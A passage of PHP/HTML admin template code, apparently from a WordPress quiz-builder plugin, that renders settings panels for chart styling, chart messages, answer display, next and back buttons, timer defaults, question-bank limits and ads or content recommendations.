														<div><input id="sqb_spider_bar_chart_font_size" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="1" data-slider-max="50" data-slider-step="1" data-slider-value="<?php echo $sqb_spider_bar_chart_font_size; ?>"></div>
													</div>	
														
													<div class="inner_template_style_box col-md-4">
														<h4>Font weight</h4>
														<div><input id="sqb_spider_bar_chart_font_weight" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="100" data-slider-max="900" data-slider-step="100" data-slider-value="<?php echo $sqb_spider_bar_chart_font_weight; ?>"></div>
													</div>	
																							
													<div class="inner_template_style_box col-md-6">
														<h4>Font Family</h4>
														<p><select id="sqb_spider_bar_chart_font_family">
															<?php foreach($font_family_array as $key => $value){ 
																$font_family_selected = "";
																if($value == $sqb_spider_bar_chart_font_family){
																	$font_family_selected = "selected='selected'";
																}
																?>
																<option value="<?php echo $value; ?>" <?php echo $font_family_selected; ?>><?php echo $key; ?></option>
															<?php } ?>
														</select></p>
													</div>	
													<div class="inner_template_style_box col-md-6">
														<h4>Chart Background Color </h4>
														<div id="charts_bar_background_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
															<input type="text" value="<?php echo $charts_bar_background_color; ?>" id="charts_bar_background_color">
															<span class="input-group-addon"><i style="background-color: <?php echo $charts_bar_background_color; ?>;"></i></span>
														</div>
													</div>
														
												</div>
											</div>
										</div>
									</div>
								</div>
								<!--Customizer ends-->
							</div>
						</div>
					</div>
					
					<div class="show_charts_for_overall_quiz" style="display:<?php if($sqb_display_charts_type_checked2 == 'checked') { echo "";  } else { echo 'none;'; }?>">	
					<hr class="sqb-bb">
					<label for="" class="quiz_label mt-3" style="color: #444;font-size: 17px;font-weight: 600;">Do not include these users in calculations</label>
					<div class="quiz_right-content">
							<label class="radio-btn--outer">
								<span class="checkbox-custom-style">
								<input class="custom-checkbox-input" type="checkbox" name="admin_users" value="admin_users" <?php echo $admin_users_checked;?>>
								<span class="custom--checkbox"></span>
								</span>
								Admin Users</label>
							<label class="radio-btn--outer">
								<span class="checkbox-custom-style">
								<input class="custom-checkbox-input" type="checkbox" name="other_users" value="other_users" <?php echo $other_users_checked;?>>
								<span class="custom--checkbox"></span>
								</span>
								Selected Users</label>							 
					</div>
					
					<div class="sqb-enter-email-ids-box" style="display:<?php echo $display_style; ?>;">
						<label for="" class="quiz_label mt-3 ml-3" style="color: #444;font-size: 17px;font-weight: 600;">Enter Email IDs 
							<div class="tool-tip" style="color:#000;">
							<i class="fa fa-info-circle" aria-hidden="true"></i>
							<div class="toll-tip-desc" style="max-width:400px;">Enter comma-separated list of email IDs</div>
							</div>
						</label>
						<div class="quiz_right-content ml-3">
							<textarea name="enter_email_id" id="enter_email_id" rows="1" cols="50" style="margin-top: 0px; margin-bottom: 0px; min-height: 36px;height: 36px;width: 680px;max-width: 680px;"><?php echo $enter_email_id_values; ?></textarea>
						</div>
					</div>
					<hr class="sqb-bb">
					<label for="" class="quiz_label mt-3" style="color: #444; font-size: 17px; font-weight: 600;">Do you want to display charts starting from a specific date? 
						<small class="sqb-small-font">It'll only include data starting from this date</small>
					</label>

					<div class="quiz_right-content">
						<div class="quiz_right-content">
							<label class="radio-btn--outer"><input type="radio" name="start_from_specific_date" value="N" <?php echo $start_from_specific_date_checked1;?>>No </label>
							<label class="radio-btn--outer"><input type="radio" name="start_from_specific_date" value="Y" <?php echo $start_from_specific_date_checked2;?>>Yes</label>									 
						</div>
						
						<div class="show_spider_bar_chart_from_input" style="display:<?php echo $show_spider_bar_chart_from_input; ?>;">
							<label for="" class="quiz_label mt-3" style="color: #444;font-size: 15px;font-weight: 600;">Enter Date <div class="tool-tip" style="color:#000;">
								<i class="fa fa-info-circle" aria-hidden="true"></i>
								<div class="toll-tip-desc" style="max-width:400px;">Chart will display results starting from this date</div>
								</div></label>
							
							<div class="quiz_right-content" >
								
								<input type="text" name="show_spider_bar_chart_from" placeholder="dd/mm/yyyyy" id="show_spider_bar_chart_from" value="<?php echo $show_spider_bar_chart_from;  ?>">
															 
							</div>
						</div>
					</div>
					</div>
					<hr class="sqb-bb">
					<label for="" class="quiz_label mt-3" style="color: #444;font-size: 17px;font-weight: 600;">Pie Chart Width (in px):</label>
					<div class="quiz_right-content">
						<div class="row">
							<div class="col-sm-10">
							<p><input id="sqb_pie_chart_width" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="200" data-slider-max="1000" data-slider-step="10" data-slider-value="<?php echo $sqb_pie_chart_width; ?>"></p>
							</div>
						</div>
					</div>

					<hr class="sqb-bb">
					<label for="" class="quiz_label mt-3" style="color: #444;font-size: 17px;font-weight: 600;">Display this message above the charts:</label>
					<div class="quiz_right-content">
						<div class="row">
							<div class="col-sm-12">
								<div class="sqb_tiny_mce_editor sqb-inline-editor-border show_spider_bar_chart_message"><?php echo $charts_message; ?></div>
							</div>
						</div>
					</div>
					<!--  -->
					<div class="quiz_right-content sqb-display-outcome-ranking">
						<hr class="sqb-bb">
						<label for="" class="quiz_label mt-3" style="color: #444;font-size: 17px;font-weight: 600;">Display this message for bar charts:</label>
						<div class="row">
							<div class="col-sm-12">
								<div class="sqb_tiny_mce_editor sqb-inline-editor-border show_bar_chart_message"><?php echo $show_bar_chart_message; ?></div>
							</div>
						</div>
					</div>

					<div class="quiz_right-content sqb-display-outcome-ranking">
						<hr class="sqb-bb">
						<label for="" class="quiz_label mt-3" style="color: #444;font-size: 17px;font-weight: 600;">Display this message for spider charts:</label>
						<div class="row">
							<div class="col-sm-12">
								<div class="sqb_tiny_mce_editor sqb-inline-editor-border show_spider_chart_message"><?php echo $show_spider_chart_message; ?></div>
							</div>
						</div>
					</div>

					<div class="quiz_right-content sqb-display-outcome-ranking">
						<hr class="sqb-bb">
						<label for="" class="quiz_label mt-3" style="color: #444;font-size: 17px;font-weight: 600;">Display this message for pie charts:</label>
						<div class="row">
							<div class="col-sm-12">
								<div class="sqb_tiny_mce_editor sqb-inline-editor-border show_pie_chart_message"><?php echo $show_pie_chart_message; ?></div>
							</div>
						</div>
					</div>
					<!--  -->
					<div class="quiz_right-content sqb-display-cumulative-outcome-ranking">
						<hr class="sqb-bb">
						<label for="" class="quiz_label mt-3" style="color: #444;font-size: 17px;font-weight: 600;">Display this message for bar charts:</label>
						<div class="row">
							<div class="col-sm-12">
								<div class="sqb_tiny_mce_editor sqb-inline-editor-border cumulative_show_bar_chart_message"><?php echo $cumulative_show_bar_chart_message; ?></div>
							</div>
						</div>
					</div>

					<div class="quiz_right-content sqb-display-cumulative-outcome-ranking">
						<hr class="sqb-bb">
						<label for="" class="quiz_label mt-3" style="color: #444;font-size: 17px;font-weight: 600;">Display this message for spider charts:</label>
						<div class="row">
							<div class="col-sm-12">
								<div class="sqb_tiny_mce_editor sqb-inline-editor-border cumulative_show_spider_chart_message"><?php echo $cumulative_show_spider_chart_message; ?></div>
							</div>
						</div>
					</div>

					<div class="quiz_right-content sqb-display-cumulative-outcome-ranking">
						<hr class="sqb-bb">
						<label for="" class="quiz_label mt-3" style="color: #444;font-size: 17px;font-weight: 600;">Display this message for pie charts:</label>
						<div class="row">
							<div class="col-sm-12">
								<div class="sqb_tiny_mce_editor sqb-inline-editor-border cumulative_show_pie_chart_message"><?php echo $cumulative_show_pie_chart_message; ?></div>
							</div>
						</div>
					</div>
					<!--  -->
					<hr class="sqb-bb">
					<label for="" class="quiz_label mt-3" style="color: #444;font-size: 17px;font-weight: 600;">Translate  <small class="sqb-small-font">(The translated text will be displayed on the outcome charts)</small></label>
					<div class="quiz_right-content">
						<div class="row">
							<div class="col-sm-10">
								<!--<label for="" class="quiz_label" style="color: #444;font-size: 15px;font-weight: 600;">Total Response </label>-->
								<div class="quiz_right-content" >
								<input type="text" name="sqb_spider_charts_total_response_text" id="sqb_spider_charts_total_response_text" value="<?php echo $total_response_text; ?>">						 
								</div>
							</div>
						</div>
					</div><!---->
					
					<hr class="sqb-bb">
					<label for="" class="quiz_label mt-3" style="color: #444;font-size: 17px;font-weight: 600;">Display this message above the question/answer breakdown:</label>
					<div class="quiz_right-content">
						<div class="row">
							<div class="col-sm-12">
								<div class="sqb_tiny_mce_editor sqb-inline-editor-border show_QA_chart_message"><?php echo $sqb_QA_charts_heading_message; ?></div>
							</div>
						</div>
					</div>
				 
				 
				 </div>
				<div class="sqb-popup-bottom-actions">
					<button class="save-popup-bottom save_charts_customizers_values">Save</button>
				 </div>
			</div>
			
	   </div>
	</div>
	<div class="Manage_Side_Popup sqb_question_categories_order active_Side_Popup" style="display:none">
	   	<div class="Manage_Side_Popup-inner">
		  	<a href="javascript:void(0)" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
		  	<h2> <i class="fa fa-arrows" aria-hidden="true"></i> Re-order categories</h2>
		  	<div class="Manage_Side_Popup_content w-100">
				<div class="Manage_Side_Popup_content_innner">
					<div class="list-cat-names pl-3 pr-3 pt-2">
						<ul class="qns-list-cat">
						
						</ul>
					</div>
				</div>
				<div class="save-question-order-outer">
				 	<button class="save_category_question_order" onclick="sqb_save_quiz('Basic-Screen-Settings')">Save</button>
				</div>
			</div>
	   </div>
	</div>
	 
	<div class="quiz-content-card correct_ans_display assessment_scoring" style="display:none" >
		<h5 class="quiz--sub-title">Correct Answer Display</h5>
		<label for="" class="quiz_label">Do you want to do correct answer calculations? <p>If this quiz will have correct/incorrect answers, select yes below.</p></label>
		<div class="quiz_right-content">
			<label class="radio-btn--outer"><input type="radio" name="display_correctans_on_page" value="yes" <?php if(isset($quiz_data) && $quiz_data->getDisplayCorrectAnsOnPage() == 'no'){ } else{ echo  'checked="checked"';}   ?>>Yes</label>
			<label class="radio-btn--outer"><input type="radio" name="display_correctans_on_page" value="no" <?php if(isset($quiz_data) && ( $quiz_data->getDisplayCorrectAnsOnPage() == 'no')){ echo  'checked="checked"';}?>>No</label>
		</div> 
	</div>
	
	<div class="quiz-content-card  outcome_display_correct_ans assessment_scoring" style="display:none">
		<label for="" class="quiz_label">Where do you want to display correct answers?</label>
		<div class="quiz_right-content">
			 <select class="small_select display_correctans_options" name="display_correctans_options">
			 		<?php 
			 		$show_pagination = "";
			 		$show_selected = "";
			 		if((isset($quiz_data) && $quiz_data->getDisplayAnswerOptions() == 'both' && $same_page_option == "no_next_button") || (isset($quiz_data) && $quiz_data->getDisplayAnswerOptions() && $same_page_option == "category_names") ){
			 			$both_option = 'selected="selected"';
			 		}else if(isset($quiz_data) && $quiz_data->getDisplayAnswerOptions() == 'both' && $same_page_option != 'no_next_button'){ 
			 			$both_option = 'selected="selected"';
			 		}else{
			 			$both_option = '';
			 		}

			 		if((isset($quiz_data) && $quiz_data->getDisplayAnswerOptions() == 'each_page' && $same_page_option == "no_next_button") || (isset($quiz_data) && $quiz_data->getDisplayAnswerOptions() && $same_page_option == "category_names") ){
			 			$each_option = 'selected="selected"';
			 		}else if(isset($quiz_data) && $quiz_data->getDisplayAnswerOptions() == 'each_page' && $same_page_option != 'no_next_button'){ 
			 			$each_option = 'selected="selected"';
			 		}else{
			 			$each_option = '';
			 		}

			 		if((isset($quiz_data) && $quiz_data->getQuizPagination() == 'all' && $same_page_option == "no_next_button") || (isset($quiz_data) && $quiz_data->getQuizPagination() == 'all' && $same_page_option == "category_names") || (isset($quiz_data) && $quiz_data->getQuizPagination() == 'question_on_category') || (isset($quiz_data) && $quiz_data->getQuizPagination() == 'fixed_number')){
			 			$show_pagination = 'display:none"';
			 			$show_selected = 'selected="selected"';
			 			$each_option = '';
			 			$both_option = '';
			 		}

			 		?>


				  <option value="both" style="<?php echo $show_pagination; ?>" <?php echo $both_option; ?>>Show correct answers after each question and also on the final results page</option>
				  <option value="each_page" style="<?php echo $show_pagination; ?>" <?php echo $each_option; ?>>Show correct answer on each page</option>
				  <option value="result_page" <?php if(isset($quiz_data) && $quiz_data->getDisplayAnswerOptions() == 'result_page'){ echo  'selected="selected"';} echo $show_selected; ?>>Show correct answers only on the final results page</option>
				 
			 </select>   
		</div> 
	</div>

	<?php
	$show_next_btn = '';
	if(isset($quiz_data) && ( $quiz_data->getDisplayCorrectAnsOnPage() == 'yes') && ($quiz_type == "assessment" || $quiz_type == "scoring")){ 
		if($quiz_data->getDisplayAnswerOptions() == 'both' || $quiz_data->getDisplayAnswerOptions() == 'each_page'){
			$show_next_btn = 'display:none';
		}else{
			$show_next_btn = 'display:block';
		}
	}else if($quiz_type == "poll"){
		$show_next_btn = 'display:none';
	}
	?>

	<div class="quiz-content-card show_next_button_outer" style="<?php if((isset($quiz_data) && $quiz_data->getQuizPagination() == 'all' && $same_page_option == 'no_next_button') || (isset($quiz_data) && $quiz_data->getQuizPagination() == 'all' && $same_page_option == 'category_names') || (isset($quiz_data) && $quiz_data->getQuizPagination() == 'fixed_number' || $quiz_type == "form" || $quiz_type == "poll")){ echo 'display:none;'; } ?>">
		<h5 class="quiz--sub-title">Next Button Display</h5>		
		<label for="" class="quiz_label">Do you want to display next button on each question page? <small class="quiz_label_small"><strong>You can customize the color / text <a href="<?php echo get_site_url(); ?>/wp-admin/admin.php?page=sqb_settings" target="_blank">here</a>.</strong></small></label>
		
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="show_next_button" type="checkbox" id="show_next_button" value="Y" <?php  if($show_next_button_checked =="checked") { echo " checked"; } else{ echo "";}?>>
				<label for="show_next_button"></label>
			</div>
			<div class="mt-4 show_next_answer_correct_message alert alert-v2 alert-danger" style="display:none;"></div>
		</div>		
	</div>

	<?php
		$show_back_btn = 'style="display:block;"';
		$allow = "checked='checked'";
		$notallow = '';
		$show_back_button_options = 'style="display:none;"';
		$show_back_btn_error = "display:none";


		if(isset($quiz_data) && ($quiz_type == "personality" || $quiz_type == "scoring" || $quiz_type == "survey" || $quiz_type == "assessment" || $quiz_type == "calculator")){

			if($quiz_pagination =="all"){
				$show_back_btn = 'style="display:none;"';
			}else{
				$show_back_btn = 'style="display:block;"';
			}

			if(isset($quiz_data) && $quiz_data->getShowBackButton()){ 
				$show_button = explode('|',$quiz_data->getShowBackButton());

				if(isset($show_button[0])){
					if($show_button[0] == "Y"){
						$show_back_button_options = '';
					}else{ 
						$show_back_button_options = 'style="display:none;"';
					} 
				}

				if(isset($show_button[1])){
					if($show_button[1] == "allow"){
						$allow = "checked='checked'";
					}else{
						$allow = '';
						$notallow = "checked='checked'";
						$show_back_btn_error = "";
					}
				}			 	
		 	}
			
		}else if(isset($quiz_data) && ($quiz_type == "form" || $quiz_type == "poll")){
			$show_back_btn = 'style="display:none;';
		}

		
	?>

	<div class="quiz-content-card show_back_button_outer" <?php echo $show_back_btn;?>>
		<h5 class="quiz--sub-title">Back Button</h5>		
		<label class="quiz_label">Do you want to display back button on each question page? <small class="quiz_label_small"><strong>You can customize the color / text on question screen.</strong></small></label>
		
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="show_back_button" type="checkbox" id="show_back_button" value="Y" <?php  if($show_back_button_checked =="checked") { echo " checked"; } else{ echo "";}?>>
				<label for="show_back_button"></label>
			</div>
		</div>
		<div class="quiz-content-card sqb_back_button_outer" <?php echo $show_back_button_options; ?>>
			<div class="quiz_right-content">
				<label for="back-button-allow" class="radio-btn--outer"><input type="radio" id="back-button-allow" name="back-button-change" value="allow" <?php echo $allow; ?>> Allow users to change answers
				</label>
				<label for="back-button-notallow" class="radio-btn--outer"><input type="radio" id="back-button-notallow" name="back-button-change" value="notallow" <?php echo $notallow; ?>> Do not allow users to change answers. They can just review answers.
				</label>
				<div class="show_back_btn_error_msgs">
					<span>If you enable "advanced rules" in the outcome tab, back button won't work. SQB will not show it in the frontend. If you enable Facebook events, the events are triggered as soon as users pick an answer choice. SQB will resend the new answer choice also.</span>
					<span class="show_back_btn_error" style="<?php echo $show_back_btn_error; ?>">As you have enabled "previous" button but disabled the "change of answer selection" when users go back, a next button will automatically appear to allow users to move forward after they click on previous.</span></div>
			</div>
		</div>		
	</div>
	
	
	<div class="quiz-content-card outcome_page_show" style="display:none !important">
		<label for="" class="quiz_label">Do you want to display a summary of question/answers on the outcome screen?</label>
		<div class="quiz_right-content">
			<label class="radio-btn--outer"><input type="radio" name="display_quesans_on_outcome" value="yes" <?php if(isset($quiz_data) && ( $display_quesans_on_outcome == 'no')){}else{ echo  'checked="checked"';}?>>Yes</label>
			<label class="radio-btn--outer"><input type="radio" name="display_quesans_on_outcome" value="no" <?php if(isset($quiz_data) && $display_quesans_on_outcome == 'no'){ echo  'checked="checked"';}?>>No</label>									 
		</div> 
	</div>
	 
	 
	 <div class="quiz-content-card redirect_show" style="display:none !important">
		<label for="" class="quiz_label">Where do you want to redirect users?</label>
		<div class="quiz_right-content"> 
				  <select class="small_select" name="outcome_redirect_url">
					  <option value="outcome_redirect_url">Select </option>
					  
				 </select>   							 
		</div>
	</div>	  
	
	  <!-- timer html start ---> 
	<?php 

	$quiz_timer_html = '<div class="sqb_tiny_mce_editor " ><div ><span style="font-size: 13pt;" ><strong>Time Left: %%TIMELEFT%%</strong></span></div></div>'; 
	$quiz_timer_spent_html = '<div class="sqb_tiny_mce_editor " ><div>	<span style="font-size: 13pt;" ><strong>Time Spent: %%TIMESPENT%%</strong></span></div></div>'; 
	$quiz_timer_expired_msg = '<div class="sqb_tiny_mce_editor "><div>Time expired. Sorry, you will not be able to continue with this quiz. Please opt-in to see the result.</div></div>';
	$timer_enable = 'N'; 
	$quiz_timer_hours = 00;
	$quiz_timer_mint = 00;
	$quiz_timer_sec = 00;
	$quiz_timer_elapses = 'show_last_screen';
	$quiz_timer_display_in_screen = 'question';
	$timer_edit_class = '';
	$timer_btn_text = 'Click to Configure Timer Settings';
	$timer_text_hour_html = '<div class="sqb_tiny_mce_editor "><div>HRS</div></div>';
	$timer_text_mint_html = '<div class="sqb_tiny_mce_editor "><div>MIN</div></div>';
	$timer_text_sec_html = '<div class="sqb_tiny_mce_editor "><div>SEC</div></div>';
	
	
	if(isset($quiz_data)){
		$timer_edit_class = ' timer_cutomizer_show_option_cutomize';
		
		$timer_customizer = $quiz_data->getTimerCustomizer();
		if($timer_customizer != ''){
			$timer_btn_text = 'Edit Timer Settings';
			$timer_customizer_array = explode('||',$timer_customizer);
			
			
			if(isset($timer_customizer_array[0])){
				$timer_enable = $timer_customizer_array[0];
			}
			
			if(isset($timer_customizer_array[1])){
				$quiz_timer_hours = $timer_customizer_array[1];
			}
			if(isset($timer_customizer_array[2])){
				$quiz_timer_mint = $timer_customizer_array[2];
			}
			
			if(isset($timer_customizer_array[3])){
				$quiz_timer_sec = $timer_customizer_array[3];
			}
			
			
			
			if(isset($timer_customizer_array[4])){
				$quiz_timer_elapses = $timer_customizer_array[4];
			}
			
			if(isset($timer_customizer_array[5])){
				$quiz_timer_display_in_screen = $timer_customizer_array[5];
			}
			
			$quiz_timer_html_data = $quiz_data->getTimerHtml();
			$quiz_timer_html_data_array = explode('||||',$quiz_timer_html_data);
			if(isset($quiz_timer_html_data_array[0])){
				$quiz_timer_html = $quiz_timer_html_data_array[0];
			}
			if(isset($quiz_timer_html_data_array[1])){
				$quiz_timer_spent_html = $quiz_timer_html_data_array[1];
			}
			
			if(isset($quiz_timer_html_data_array[2])){
				$timer_text_hour_html = $quiz_timer_html_data_array[2];
			}
			if(isset($quiz_timer_html_data_array[3])){
				$timer_text_mint_html = $quiz_timer_html_data_array[3];
			}
			if(isset($quiz_timer_html_data_array[4])){
				$timer_text_sec_html = $quiz_timer_html_data_array[4];
			}
			
			$quiz_timer_expired_msg = $quiz_data->getTimerExpiredMsg();
		}
		
		
	}
		
	?>

	<!-- ----------------------------- -->

	<?php 

	$question_bank_explode = '';
	$checked = '';
	$show_checked = '';
	$second_style = 'display:none';
	$question_val = '';
	$qb_style = 'display:none';

	if(isset($quiz_data)){
		$question_bank = $quiz_data->getQuestionBankOption();

		$question_bank_explode = explode('||',$question_bank);

		if(isset($question_bank_explode[0]) && $question_bank_explode[0] == 'Y'){
			$qb_style = 'display:block';
			$checked = "checked='checked'";
		}else{
			$qb_style = 'display:none';
			$checked = '';
		} 

		if(isset($question_bank_explode[1]) && $question_bank_explode[1] == 'Y'){
			$show_checked = "checked='checked'";
		}else{
			$show_checked = '';
		}

		if(isset($question_bank_explode[0]) && $question_bank_explode[0] == 'Y' && isset($question_bank_explode[1]) && $question_bank_explode[1] == 'Y'){
			$second_style = 'display:block';
		}else{
			$second_style = 'display:none';
		} 

		if(isset($question_bank_explode[2]) ){ 
			$question_val = $question_bank_explode[2]; 
		}
	} ?>

	<div class="quiz-content-card question_bank_option" style="<?php if(isset($quiz_data) && ($quiz_type == "form" || $quiz_type == "poll")){echo 'display:none';}?>">
		<h5 class="quiz--sub-title">Question Bank</h5>

		<label for="" class="quiz_label">Do you want to select questions from the question bank?  <div class="tool-tip"><i class="fa fa-info-circle" aria-hidden="true"></i>
					<div class="toll-tip-desc" style="max-width:400px;">You can add / select questions from other quizzes</div>
					</div>
		</label>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="select_quiz_bank" type="checkbox" id="select_quiz_bank" value="N" <?php echo $checked; ?>>
				<label for="select_quiz_bank"></label>
			</div>
		</div>

	<div class="quiz-content-card limit-questions-section pb-0 border-0" style="<?php echo $qb_style; ?>">
		<label for="" class="quiz_label">Do you want to limit the questions displayed to the users? <div class="tool-tip"><i class="fa fa-info-circle" aria-hidden="true"></i>
					<div class="toll-tip-desc" style="max-width:400px;">Set this to yes if you have say a total of 100 questions in this quiz but you want SQB to randomly pick say 10 questions and only display 10 at a time to the users.</div>
					</div></label>
		<div class="quiz_right-content">
				<div class="square-switch_onoff">
				<input class="checkbox" name="limit_questions_displayed" type="checkbox" id="limit_questions_displayed" value="N" <?php echo $show_checked; ?>>
				<label for="limit_questions_displayed"></label>
			</div>
		</div>
	</div>

	

	<div class="quiz-content-card bank-limit-to pb-0 border-0" style="<?php  echo $second_style; ?>">
		<label for="" class="quiz_label">Limit questions to </label>
		<div class="quiz_right-content">
			<input type="number" name="limit_input" id="limit_input" value="<?php echo $question_val; ?>">
		</div>
	</div>
	</div>
	

	<!-- ------------------------------ -->

	<div class="quiz-content-card show_recomendation_ads_button border-bottom-0" style="<?php 
	if(isset($quiz_data) && ($quiz_type == "form" || $quiz_type == "poll") || (isset($quiz_data) && $quiz_data->getQuizPagination() == 'question_on_category') || (isset($quiz_data) && $quiz_data->getQuizPagination() == 'fixed_number')){
		echo 'display:none';}
	?>">
		<h5 class="quiz--sub-title">Display Ads / Content Recommendation</h5>		
		<!-- <label for="" class="quiz_label">Do you want to display next button on each question page?</label> -->
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="ads_or_recommendation" type="checkbox" id="ads_or_recommendation" value="Y" <?php echo $quiz_rec_ads; ?>>
				<label for="ads_or_recommendation"></label>
			</div>
		</div>	

		<div class="quiz_right-content show_hide_ads_option mt-4" style="<?php echo $quiz_rec_ads_show; ?>">
			<label class="radio-btn--outer"><input type="radio" name="quiz_ads_recommendation" value="content_recomendation" checked="">Content Recommendation (for answers)</label>
			<label class="radio-btn--outer"><input type="radio" name="quiz_ads_recommendation" value="show_ads" <?php if(isset($quiz_data) && $quiz_data->getQnsAds() == 'Y'){echo 'checked'; } ?>> Show Ads (at question level)</label>
			<!--<label class="radio-btn--outer"><input type="radio" name="quiz_pagination" value="limited" > Limited (use pagination) </label>-->		
		</div>	




		<div class="quiz-content-card border-bottom-0 pb-0 content_recommendation_option" style="display: none;">
			<label for="" class="quiz_label">Do you want to display content recommendations for this quiz?
				<div class="tool-tip">
					<i class="fa fa-info-circle" aria-hidden="true"></i>
					<div class="toll-tip-desc" style="max-width:400px;">If enabled, you can display different recommendation 
				/ messages after an answer choice is selected by the user in the frontend. SQB will first display the recommendation and the users can click on the next button to go to the next question.</div>
				</div>
			</label>
			<div class="quiz_right-content">
				<div class="square-switch_onoff">
					<input class="checkbox" name="quiz_recommendation_option" type="checkbox" id="quiz_recommendation_option"  <?php if($quiz_recommendation_option == 'Y'){ echo "checked='checked'"; }?> >
					<label for="quiz_recommendation_option"></label>
				</div>
			</div>	
		</div>
		<?php
		$recomended_next_button_html = '<div class="single_next_btn sqb_next_btn sqb_tiny_mce_editor mce-content-body" style="display: inline-block; border-radius: 5px; background: rgb(37, 37, 37); color: rgb(255, 255, 255); height: auto; padding: 13px 15px; font-family: &quot;DM Sans&quot;, sans-serif; min-width: 90px; box-shadow: none; margin: 0px; text-decoration: none; line-height: normal; border: none; text-align: center; text-transform: initial; font-size: 16px; font-weight: 600; width: 128px; max-width: 100%; cursor: pointer; float: none; position: relative;" contenteditable="true" spellcheck="false"><div>Next</div></div>';
		if(isset($quiz_data)){ 
			$recomended_next_button = $quiz_data->getRecommendedNextButton();	
			if($recomended_next_button != ''){
				$recomended_next_button_html = $recomended_next_button;
			}
		} 
		?>
	
		<div class="quiz-content-card content-recommendation-child border-bottom-0 pb-0 pt-0" style="display:<?php if($quiz_recommendation_option == 'Y'){ echo "block"; } else { echo "none"; } ?>">

			<div class="sqb_select_chart_message mt-2" style="max-width: 1110px;">
				If you want to display a content recommendation screen when users pick a specific answer, select this option.
			</div>

			<div class="row">
				<div class="col-sm-8">
					<div class="quiz-card-outer-gray restriction_settings mb-0" style="background-color: #fff;">
						<h5 class="quiz--sub-title" style="background-color: #f9fafb;font-size: 16px;">Next Button (This will be displayed on the "Content Recommendation" screen)</h5>
						<div class="recommended_next_temp_container recommended_next_template_html_preview_outer text-center mb-3">
							<?php echo $recomended_next_button_html; ?>
						</div>
							
							<!--Customizer Start-->
						<div class="Template-Customize-setting-outer Template-Customize-horizontal-style">
							 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
								<div class="customizer_innner_sections">
									<div class="Template-Customize-element">
										<div class="Template-Customize-element-inner element_paddings">
											<div class="inner_template_style_box">
												<h4>Width</h4>
												<p>
													<input id="sqb_cr_next_button_width" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="900" data-slider-step="1" data-slider-value="0">
												</p>
											</div>											
											<div class="inner_template_style_box ">
												<h4>Height</h4>
												<p>
													<input id="sqb_cr_next_button_height" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="200" data-slider-step="1" data-slider-value="13">
												</p>
											</div>											
											<div class="inner_template_style_box ">
												<h4>Background </h4>
												<div id="sqb_ce_nextbutton_backgroud_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="#4f6cbf" id="sqb_ce_nextbutton_backgroud_color">
													<span class="input-group-addon"><i style="background-color: #4f6cbf;"></i></span>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>	
		<!-- ----------------- -->
		<div class="quiz-content-card border-bottom-0 pb-0 content_ads_option" style="display: none;">
			<h5 class="quiz--sub-title">Show Ads</h5>		
			<div class="quiz_right-content">
				<div class="square-switch_onoff">
					<input class="checkbox" name="quiz_ads_option" type="checkbox" id="quiz_ads_option"  <?php if($quiz_ads_option == 'Y'){ echo "checked='checked'"; }?> >
					<label for="quiz_ads_option"></label>
				</div>
			</div>	
		</div>
		<?php
		$ads_next_button_html = '<div class="single_next_btn sqb_next_btn sqb_tiny_mce_editor mce-content-body" style="display: inline-block; border-radius: 5px; background: #ad4fe1; color: rgb(255, 255, 255); height: auto; padding: 13px 15px; font-family: &quot;DM Sans&quot;, sans-serif; min-width: 90px; box-shadow: none; margin: 0px; text-decoration: none; line-height: normal; border: none; text-align: center; text-transform: initial; font-size: 16px; font-weight: 600; width: 128px; max-width: 100%; cursor: pointer; float: none; position: relative;" contenteditable="true" spellcheck="false"><div>Next</div></div>';
		if(isset($quiz_data)){ 
			$ads_next_button = $quiz_data->getAdsNextButton();	
			if($ads_next_button != ''){
				$ads_next_button_html = $ads_next_button;
			}
		} 
		?>
	
		<div class="quiz-content-card content-ads-child border-bottom-0 pb-0 pt-0" style="display:<?php if($quiz_ads_option == 'Y'){ echo "block"; } else { echo "none"; } ?>">
			<div class="sqb_select_chart_message mt-0" style="max-width: 1110px;">
				If you want to display an Ad or Content recommendation screen when users answer a specific question, select this option.
			</div>
			<div class="row">
				<div class="col-sm-8">
					<div class="quiz-card-outer-gray restriction_settings mb-0" style="background-color: #fff;">
						<h5 class="quiz--sub-title" style="background-color: #f9fafb;font-size: 16px;">Next Button (This will be displayed on the "Ads" screen)</h5>
						<div class="ads_next_temp_container ads_next_template_html_preview_outer text-center mb-3">
							<?php echo $ads_next_button_html; ?>
						</div>
						<div class="Template-Customize-setting-outer Template-Customize-horizontal-style">
							 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
								<div class="customizer_innner_sections">
									<div class="Template-Customize-element">
										<div class="Template-Customize-element-inner element_paddings">
											<div class="inner_template_style_box">
												<h4>Width</h4>
												<p>
													<input id="sqb_ads_next_button_width" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="900" data-slider-step="1" data-slider-value="0">
												</p>
											</div>											
											<div class="inner_template_style_box ">
												<h4>Height</h4>
												<p>
													<input id="sqb_ads_next_button_height" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="200" data-slider-step="1" data-slider-value="13">
												</p>
											</div>											
											<div class="inner_template_style_box ">
												<h4>Background </h4>
												<div id="sqb_ads_nextbutton_backgroud_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="#ad4fe1" id="sqb_ads_nextbutton_backgroud_color">
													<span class="input-group-addon"><i style="background-color: #ad4fe1;"></i></span>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>	
	</div>
	<!-- ----------------- -->
